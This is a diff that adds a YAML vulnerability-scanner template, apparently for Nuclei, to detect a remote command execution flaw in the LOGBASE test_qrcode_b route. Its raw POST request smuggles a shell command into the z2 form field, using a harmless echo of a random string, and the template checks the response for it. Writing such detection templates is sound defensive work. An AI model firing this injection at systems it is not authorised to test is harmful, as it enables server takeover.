@@ -1,0 +1,53 @@
+id: logbase-test_qrcode_b-rce
+
+info:
+  name: LOGBASE test_qrcode_b Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    LOGBASE test_qrcode_b route has a remote command execution vulnerability.
+    Allows attackers to execute arbitrary commands on the server with potential
+    full control.
+  metadata:
+    cve: ""
+    cvss-score: 9.6
+    product: Sifudi-LOGBASE
+    tags: rce, command-execution
+
+http:
+  - raw:
+      - |
+        POST /bhost/test_qrcode_b HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}
+
+        z1=1&z2="|echo {{randstr}};"&z3=bhost
+
+    extractors:
+      - type: regex
+        name: echo_response
+        part: body
+        regex:
+          - "{{randstr}}"
+        internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "{{randstr}}"
+
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - "echo"
+
+variables:
+  randstr: "{{rand_base(8)}}"
